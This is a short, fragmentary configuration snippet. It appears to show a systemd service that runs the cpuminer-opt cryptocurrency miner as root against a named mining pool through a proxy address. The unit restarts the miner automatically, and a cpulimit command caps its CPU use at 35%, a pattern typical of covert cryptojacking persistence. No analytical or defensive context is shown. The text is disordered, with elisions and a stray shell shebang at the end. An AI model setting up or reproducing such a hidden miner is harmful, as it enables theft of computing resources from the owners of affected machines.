...
[Service]
ExecStart= /usr/local/src/cpuminer-opt-3.8.3.1/cpuminer -a lyra2z330 -o stratum+tcp://hxx-pool2.chainsilo.com:3032 -u manlytq.lion -p x -x 207.148.0.150:1191
WatchdogSec=353
Restart=always
RestartSec=60
User=root
...
cpulimit --exe cpuminer --limit 35 -b &&
#!/bin/bash
